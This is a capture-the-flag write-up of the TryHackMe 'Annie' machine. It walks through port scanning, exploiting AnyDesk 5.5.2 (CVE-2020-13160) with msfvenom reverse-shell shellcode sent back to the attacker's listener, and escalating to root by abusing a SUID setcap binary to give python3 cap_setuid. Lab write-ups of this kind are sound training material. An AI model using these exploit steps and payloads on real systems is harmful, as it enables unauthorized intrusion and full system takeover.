# Annie

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: Remote Code Execution vulnerability in the AnyDesk service.

Privilege Escalation: Abused SUID binary.

---

### Nmap Scan Results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=2000 10.10.165.99 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 08:44 EDT
Nmap scan report for 10.10.165.99
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open  ssl/realserver?
38017/tcp open  unknown
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Open Ports and Service Available:

| Port | Service | Notes |
| --- | --- | --- |
| **22** | SSH (OpenSSH 7.6p1) | Might be used for privilege escalation or lateral movement once creds are found |
| **7070** | ssl/realserver? | Suspicious and uncommon, running over SSL. Further investigation required. |
| **38017** | unknown | Likely a custom service or non-standard port. Requires banner grabbing or manual interaction |

---

### Port 38017:

Could be MongoDB or another custom web-based service.

Banner grabing:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ nc 10.10.165.99 38017
(UNKNOWN) [10.10.165.99] 38017 (?) : Connection refused
```

Maybe we can connect with curl:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ curl http://10.10.165.99:38017
curl: (7) Failed to connect to 10.10.165.99 port 38017 after 276 ms: Could not connect to server
```

Nothing found here! Looks like it’s a dead end.

---

### Port 7070:

Likely HTTPS or a custom SSL-encrypted service.

We can check that via getting certificate information:

```bash
openssl s_client -connect 10.10.165.99:7070
```

And we get some information about the server running: Anydesk

![image.png](image.png)

Let’s search on google, if any exploit available for this service.

There I got a exploit(remote code execution) for version 5.5.2, although we don’t know what version is running on target machine, but we can still try that.

[AnyDesk 5.5.2 - Remote Code Execution](https://www.exploit-db.com/exploits/49613)

![image.png](image%201.png)

![image.png](image%202.png)

Let’s get that exploit on our working directory.

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ searchsploit -m linux/remote/49613.py

  Exploit: AnyDesk 5.5.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49613
     Path: /usr/share/exploitdb/exploits/linux/remote/49613.py
    Codes: CVE-2020-13160
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/ghost/tryhackme/annie/49613.py
       
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ ls
49613.py  nmap.full
```

We have to modify this payload a little bit. Have to change ip to target machine and our own shellcode which we can generate via this command:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.87.131 LPORT=4445 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x98\x9c\xce"
shellcode += b"\xea\xe2\x40\x85\x54\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xf2\xb5\x96\x73\x88"
shellcode += b"\x42\xda\x3e\x99\xc2\xc1\xef\xaa\xd7\xcd\xed"
shellcode += b"\x9a\x9c\xdf\xb7\xe8\x51\xd2\xd7\xc9\xd4\x47"
shellcode += b"\x0c\x88\x50\xdf\x3e\xb2\xc4\xc1\xef\x88\x43"
shellcode += b"\xdb\x1c\x67\x52\xa4\xcb\xba\x4f\x80\x21\x6e"
shellcode += b"\xf6\xf5\xb2\x7b\x08\x3e\x7b\xfa\xf5\xa0\xc5"
shellcode += b"\x91\x28\x85\x07\xd0\x15\x29\xb8\xb5\x08\x0c"
shellcode += b"\xb2\x97\x99\xce\xea\xe2\x40\x85\x54"
```

Copy this shellcode and replace in payload.

![image.png](image%203.png)

Just setup our netcat on listning mode on port 4445:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
```

Run that payload and we’ll get a reverse shell within few seconds:

```bash
┌──(ghost㉿kali)-[~/tryhackme/annie]
└─$ python2 49613.py
sending payload ...
reverse shell should connect within 5 seconds
```

![image.png](image%204.png)

We can now grab the user flag:

```bash
annie@desktop:/home/annie$ ls -la
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
annie@desktop:/home/annie$ cat user.txt
cat user.txt
THM{REDACTED}
```

---

### Privilege Escalation

While searching for vectors for privilege escalation, I found that we don’t have sudo privilege, no cronjob running, not any interesting files. So, I went for searching SUID binaries and there I saw a unusual binary /sbin/setcap.

![image.png](image%205.png)

The `setcap` binary is a Linux tool used to assign **capabilities** to executables. Capabilities are a fine-grained alternative to the all-or-nothing root privileges traditionally used by Unix systems. If **`setcap` is SUID-root** or the current user can **run it as root** (e.g., via `sudo` or misconfigured permissions), it can be abused to escalate privileges.

Searched on google for privesc through this binary and came out to a post of Hackingarticles.

[Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

Let’s exploit it step by step:

1. Locate python binary:
    
    ```bash
    annie@desktop:/tmp/anydesk$ which python3
    which python3
    /usr/bin/python3
    ```
    
2. Copy python3 binary to /home/annie folder
    
    ```bash
    annie@desktop:/tmp/anydesk$ cp /usr/bin/python3 /home/annie
    ```
    
3. Assign cap_setuid capability:
    
    ```bash
    annie@desktop:/home/annie$ setcap cap_setuid+ep /home/annie/python3
    ```
    
4. Check if it’s successfull:
    
    ```bash
    annie@desktop:/home/annie$ getcap -r / 2>/dev/null
    getcap -r / 2>/dev/null
    /home/annie/python3 = cap_setuid+ep
    /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
    /usr/bin/mtr-packet = cap_net_raw+ep
    /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
    ```
    
5. Spawn root shell:
    
    ```bash
    annie@desktop:/home/annie$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    <c 'import os; os.setuid(0); os.system("/bin/bash")'
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    root@desktop:/home/annie# whoami
    whoami
    root
    ```
    
6. Grab root’s flag:
    
    ```bash
    root@desktop:/home/annie# cd /root
    cd /root
    root@desktop:/root# ls -la
    ls -la
    total 44
    drwx------  5 root root 4096 Mar 23  2022 .
    drwxr-xr-x 22 root root 4096 Mar 23  2022 ..
    drwxr-xr-x  3 root root 4096 May 14  2022 .anydesk
    lrwxrwxrwx  1 root root    9 Mar 23  2022 .bash_history -> /dev/null
    -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
    drwx------  2 root root 4096 Mar 23  2022 .cache
    -rwxr-xr-x  1 root root   56 Mar 23  2022 .display10.sh
    drwxr-xr-x  3 root root 4096 Mar 23  2022 .local
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    -rw-r--r--  1 root root   66 Mar 23  2022 .selected_editor
    -rw-r--r--  1 root root   81 Mar 23  2022 THM-Voucher.txt
    -rw-r--r--  1 root root   26 Mar 23  2022 root.txt
    root@desktop:/root# cat root.txt
    cat root.txt
    THM{REDACTED}
    ```
    

---

That’s it for this machine.✅